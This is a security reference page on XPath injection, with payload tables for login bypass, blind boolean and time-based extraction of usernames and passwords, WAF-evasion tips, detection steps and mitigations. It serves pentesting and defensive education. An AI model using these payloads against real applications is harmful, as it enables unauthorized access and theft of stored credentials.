---
title: XPath Injection
---

# XPath Injection

**XPath Injection** is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.

---

## Fundamentals

### How XPath Works

XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details.

Example XML:

```xml
<users>
    <user>
        <username>admin</username>
        <password>admin123</password>
    </user>
</users>
```

Example XPath query:

```
/users/user[username='admin']
```

If user input is directly concatenated into the query, an attacker may manipulate the XPath expression and change its logic.

---

## Common XPath Functions

| Function | Purpose |
| --- | --- |
| `count()` | Count matching nodes |
| `name()` | Get node name |
| `text()` | Read node value |
| `substring()` | Extract characters |
| `string-length()` | Determine string length |
| `contains()` | Check substring |
| `starts-with()` | Check prefix |
| `last()` | Last node |
| `position()` | Current node index |

---

## XPath Versions

- XPath 1.0 (Most common)
- XPath 2.0
- XPath 3.0 / 3.1

Most web applications still use XPath 1.0.

---

## Identifying XPath Injection

### Possible Signs:

- XML-based backend
- Login or search forms using XML datasets
- Custom CMS or legacy systems
- Unexpected errors on special character input (`'`, `"`, `]`, `)`, `@`, etc.)

---

## Attack Surface

Look for XML-backed functionality in:

- Login forms
- Search functionality
- XML APIs
- SOAP services
- SAML authentication
- XML import/export
- Configuration uploads
- RSS/Atom feeds
- XML file uploads
- Mobile applications using XML
- Legacy Java/.NET applications

---

## Testing Inputs (Basic Payloads)

| Goal | Payload | Notes |
| --- | --- | --- |
| Authentication Bypass | `' or '1' = '1` | Similar to SQLi logic |
| Universal True | `admin' or '1'='1` | Always returns true |
| Universal False | `admin' and '1'='2` | Always false |
| Close predicate | `' or '1'='1' or ''='` | Unbalances logic |
| Blind Bypass | `admin' or count(//user) > 0 or ''='` | Check response time / content |

---

## Authentication Bypass Attacks

### Scenario: XPath Query on Login

```xml
/users/user[username/text()='admin' and password/text()='admin']
```

### Bypass Payloads

```xml
admin' or '1'='1
admin' or 'a'='a
' or ''='
```

- These manipulate the query to return true, regardless of password.

---

## Blind XPath Injection

Used when no error messages or output leakage occurs.

### Boolean-based (True/False)

```xml
' or count(//user)=1 or '1'='2
' or count(//user)=2 or '1'='2
```

### Character Extraction

Using substring and string-length:

```xml
' or substring(name(/*),1,1)='r' or '1'='2
' or string-length(name(/*))=4 or '1'='2
```

### Time-based XPath (requires app using XSLT/XPath extension functions)

```xml
' or java.lang.Thread.sleep(5000) or '1'='2
```

---

## Enumeration Examples

### Get number of users

```xml
' or count(//user)=1 or '1'='2
```

### Extract Number of Child Nodes

```xml
name=' or count(//user[position()=1]/child::node())=5  or '1'='1&pass=test
```

### Extract number of characters

### Extract user name character-by-character

```xml
' or substring(//user[1]/username/text(),1,1)='a' or '1'='2
' or substring(//user[1]/username/text(),2,1)='d' or '1'='2
```

### Extract Password

```
' or substring(//user[1]/password/text(),1,1)='a' or '1'='2
```

---

### Extract Email

```
' or substring(//user[1]/email/text(),1,1)='a' or '1'='2
```

---

### Count Users

```
' or count(//user)=5 or '1'='2
```

---

## XPath Injection Techniques Summary

| Technique | Description | Example |
| --- | --- | --- |
| Boolean-based | True/False responses | `' or 1=1 or 'a'='b` |
| Blind | Infer info from output delay or structure | `' or substring(//user[1]/username,1,1)='a` |
| Error-based | Parse error leakage (less common) | Unbalanced quotes |
| Time-based | Delay via Java methods in XSLT | `' or java.lang.Thread.sleep(5000) or '1'='1` |
| Out-of-Band (OOB) | Rare – with XXE or SSRF chaining | Needs multi-vector chaining |

---

## Realistic Bypass Scenario

### Query:

```xml
/users/user[username/text()='[USER]' and password/text()='[PASS]']
```

### Payload:

```bash
Username: ' or '1'='1
Password: anything
```

### Final XPath after injection:

```xml
/users/user[username/text()='' or '1'='1' and password/text()='anything']
```

### WAF & Filter Bypass

- Alternate quote styles
- Mixed casing
- URL encoding
- Double URL encoding
- Whitespace manipulation
- Nested predicates
- Using `contains()` instead of equality
- Using `starts-with()` instead of `=`
- Splitting payloads across parameters

---

## Advanced Payloads (XPath 1.0)

### Extract XML Version

```xml
' or starts-with(system-property('xsl:version'),'1') or '1'='2
```

### Checking existence of node

```xml
' or name(//user[1])='user' or '1'='2
```

### Length of text

```xml
' or string-length(//user[1]/username)=5 or '1'='2
```

---

## Framework-Specific Scenarios

### Java

Common APIs:

- XPathFactory
- XPathExpression
- JAXP
- Saxon

---

### .NET

Common APIs:

- XPathNavigator
- XPathExpression
- XPathDocument

---

### PHP

Common APIs:

- DOMXPath
- SimpleXML

---

### Python

Libraries:

- lxml
- ElementTree

---

### JavaScript / Node.js

Libraries:

- xpath
- xmldom
- libxmljs

---

## Detection Techniques

### Manual Detection

- Inject `'`, `"`, `]`, `)`, `|`, , `@`
- Test boolean conditions
- Compare true vs false responses
- Trigger parser errors
- Test substring enumeration
- Test count() based enumeration
- Observe response length differences
- Monitor redirects and login behavior

#### Useful XPath Payloads

```
' or position()=1 or '
```

```
' or last()=1 or '
```

```
' or contains(name(/*),'r') or '
```

```
' or starts-with(name(/*),'r') or '
```

```
' or string-length(//user[1]/password)=8 or '
```

```
' or substring(//user[1]/password,1,1)='a' or '
```

---

### Automated Detection

- Burp Suite Scanner
- Burp Intruder
- Burp Repeater
- Nuclei XPath templates
- OWASP ZAP
- ffuf (parameter fuzzing)

---

## Impact

Successful XPath Injection may result in:

- Authentication bypass
- Unauthorized access
- XML data disclosure
- User enumeration
- Administrative account compromise
- Blind extraction of sensitive data
- Business logic bypass
- Information disclosure
- Chaining with XXE or SSRF in XML applications

---

## Mitigation Strategies

| Strategy | Details |
| --- | --- |
| **Input Validation** | Whitelist valid inputs, reject unexpected characters like `'`, `"`, `<`, `>`, etc. |
| **Use of XPath Parameterization** | Use XPath APIs that support variables (e.g., `XPathExpression.setXPathVariableResolver()` in Java) |
| **Avoid Concatenation** | Never construct queries like `xpath = "//user[username/text()='" + user + "']"` |
| **Use JSON Instead of XML** | JSON is less prone to XPathi |
| **Proper Error Handling** | Disable detailed XML errors and stack traces |

---

## Tools

---

| Tool | Purpose |
| --- | --- |
| [XCat](https://github.com/orf/xcat) | command line tool  |
| Python + lxml | Custom exploitation |
| PayloadsAllTheThings | Payload reference |

## Good to Read:

[https://hackerone.com/reports/1626226](https://hackerone.com/reports/1626226)

[https://cyberbull.medium.com/xpath-injection-️-deep-dive-1213ad0dccb8](https://cyberbull.medium.com/xpath-injection-%EF%B8%8F-deep-dive-1213ad0dccb8)

## References:

[https://medium.com/@cc0a/blind-xpath-injection-bool-df637d5e92f0](https://medium.com/@cc0a/blind-xpath-injection-bool-df637d5e92f0)

[https://www.imperva.com/learn/application-security/xpath-injection/](https://www.imperva.com/learn/application-security/xpath-injection/)

[https://zhangzeyu2001.medium.com/blind-xpath-injections-the-path-less-travelled-6f03ce5ec8f6](https://zhangzeyu2001.medium.com/blind-xpath-injections-the-path-less-travelled-6f03ce5ec8f6)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)

[https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html)

[https://owasp.org/www-community/attacks/XPATH_Injection](https://owasp.org/www-community/attacks/XPATH_Injection)

[https://cqr.company/web-vulnerabilities/xpath-injection/](https://cqr.company/web-vulnerabilities/xpath-injection/)

[https://karol-mazurek.medium.com/appsec-tales-xxiii-xpathi-ca6171826d2a](https://karol-mazurek.medium.com/appsec-tales-xxiii-xpathi-ca6171826d2a)

[https://atharvvvsharma.medium.com/xpath-injection-30193bf326ee](https://atharvvvsharma.medium.com/xpath-injection-30193bf326ee)

[https://infosecwriteups.com/understanding-xpath-injection-with-practical-examples-6aa81043e4aa](https://infosecwriteups.com/understanding-xpath-injection-with-practical-examples-6aa81043e4aa)

[https://medium.com/cyberverse/authentication-bypass-with-x-path-injection-and-sql-injection-cyberverse-c5d8dd34ac9a](https://medium.com/cyberverse/authentication-bypass-with-x-path-injection-and-sql-injection-cyberverse-c5d8dd34ac9a)

[https://vickieli.dev/hacking/xpath-injection/](https://vickieli.dev/hacking/xpath-injection/)

[https://www.youtube.com/watch?v=AvOcikbZsik](https://www.youtube.com/watch?v=AvOcikbZsik)